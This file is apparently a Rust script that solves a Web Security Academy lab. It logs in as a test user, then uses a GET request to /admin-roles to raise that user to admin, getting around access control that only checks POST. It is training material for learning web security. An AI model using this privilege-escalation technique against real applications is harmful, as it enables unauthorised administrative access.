/*************************************************************************
*
* Lab: Method-based access control can be circumvented
*
* Hack Steps: 
*      1. Login as wiener
*      2. Upgrade wiener to be an admin via GET method instead of POST
*
**************************************************************************/
use lazy_static::lazy_static;
use regex::Regex;
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a060049037bc7ae814f845d001300d8.web-security-academy.net";

lazy_static! {
    static ref WEB_CLIENT: Client = build_web_client();
}

fn main() {
    print!("⦗1⦘ Logging in as wiener.. ");
    flush_terminal();

    let login_as_wiener = WEB_CLIENT
        .post(format!("{LAB_URL}/login"))
        .form(&HashMap::from([
            ("username", "wiener"),
            ("password", "peter"),
        ]))
        .send()
        .expect(&format!("{}", "⦗!⦘ Failed to login as wiener".red()));

    println!("{}", "OK".green());
    print!("⦗2⦘ Upgrading wiener to be an admin via GET method instead of POST.. ");
    flush_terminal();

    let session = get_session_cookie(&login_as_wiener);
    fetch_with_session("/admin-roles?username=wiener&action=upgrade", &session);

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}

fn fetch_with_session(path: &str, session: &str) -> Response {
    WEB_CLIENT
        .get(format!("{LAB_URL}{path}"))
        .header("Cookie", format!("session={session}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn get_session_cookie(response: &Response) -> String {
    let headers = response.headers();
    let cookie_header = headers.get("set-cookie").unwrap().to_str().unwrap();
    capture_pattern_from_text("session=(.*); Secure", cookie_header)
}

fn capture_pattern_from_text(pattern: &str, text: &str) -> String {
    let regex = Regex::new(pattern).unwrap();
    let captures = regex.captures(text).expect(&format!(
        "⦗!⦘ Failed to capture the pattern: {}",
        pattern.red()
    ));
    captures.get(1).unwrap().as_str().to_string()
}

#[inline(always)]
fn flush_terminal() {
    io::stdout().flush().unwrap();
}
